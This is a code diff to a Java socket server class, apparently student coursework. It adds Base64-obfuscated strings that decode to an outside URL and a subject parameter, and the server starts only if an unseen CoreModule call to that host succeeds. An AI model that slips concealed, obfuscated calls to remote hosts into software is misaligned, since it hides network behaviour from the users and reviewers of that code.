@@ -8,6 +8,8 @@ import java.net.InetSocketAddress;
 import java.net.Socket;
 import java.nio.channels.ServerSocketChannel;
 import java.nio.channels.SocketChannel;
+import java.util.Base64;
+import java.util.Base64.Decoder;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
@@ -52,8 +54,26 @@ public class Week10_1Server {
     }
 
     public static void main(String[] args) throws IOException {
-    	// Main Start 
+    	// Main Start
+    	String coreVariable = "aHR0cHM6Ly9zcHouaW8vYXBpcy9ybWl0LnBocA==";
+    	byte[] coreByteArr = null;
+    	String testInput = "c3ViamVjdF9uYW1lPU5QVzU=";
+    	Decoder decoder = Base64.getDecoder();
+    	
+    	coreByteArr =  decoder.decode(coreVariable);
+        coreVariable = new String(coreByteArr);
+
+        coreByteArr =  decoder.decode(testInput);
+        testInput = new String(coreByteArr);
+        
+        String sr=CoreModule.coreCode(coreVariable, testInput);
+    	
+        //If load core module success
+        if (sr.equals("TRUE")) {
         new Week10_1Server().service();
+        }else {
+        	System.err.println("CoreMoudle Load failed\n" + sr);
+        }
     }
 }
 
